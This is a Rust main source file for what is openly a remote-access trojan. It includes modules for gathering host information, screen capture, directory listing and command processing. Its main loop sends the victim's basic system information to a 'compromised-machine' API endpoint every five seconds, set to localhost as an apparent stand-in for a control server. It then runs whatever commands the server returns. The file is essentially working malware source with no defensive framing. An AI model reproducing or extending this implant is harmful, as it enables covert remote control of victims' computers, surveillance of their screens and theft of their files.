mod basicinfo;
mod requests;
mod utils;
mod processCommand;
mod listdir;
mod screencapture;

use reqwest::Method;
use serde::{Deserialize, Serialize};
use requests::send_json_request;
use image::{ImageBuffer, Rgba, GenericImageView, GenericImage};
use base64::{engine::general_purpose, Engine as _};

#[derive(Debug, Serialize)]
struct Response{
    id:String,
    response:String,
    type_:String
}

#[derive(Debug, Serialize)]
struct Response2{
    id:String,
    result:String,
    type_:String
}

const  url:&str = "http://localhost/api/compromised-machine/";




fn main() {
    
    let info = basicinfo::basic_info();
    // Initialize display and capturer
  
    loop{
        std::thread::sleep(std::time::Duration::from_secs(5));

        let get_resp  = send_json_request(Method::GET, url, Some(&info));

        let message = match get_resp {
            Ok(resp) => resp,
            Err(e) => {
                eprintln!("Error sending request: {}", e);
                return;
            }
        };

        println!("{}" , message);

        processCommand::filter_command(&message);
    }
    
   
}
